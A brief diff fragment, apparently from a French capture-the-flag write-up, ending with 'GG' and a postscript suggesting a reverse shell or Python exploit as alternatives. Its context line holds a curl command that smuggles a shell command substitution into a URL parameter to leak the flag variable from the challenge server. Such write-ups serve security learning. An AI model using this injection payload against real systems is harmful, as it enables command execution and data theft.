@@ -228,3 +228,5 @@ curl -g 'http://safebackup.hacknflag.fr/api/backup?mode=x[$(echo%20$FLAG)]'
 ![image.png](images/image%205.png)
 
 ### GG !
+
+> PS: On peut également ce faire un reverse shell et script en python un exploit je vous laisse tester ca  
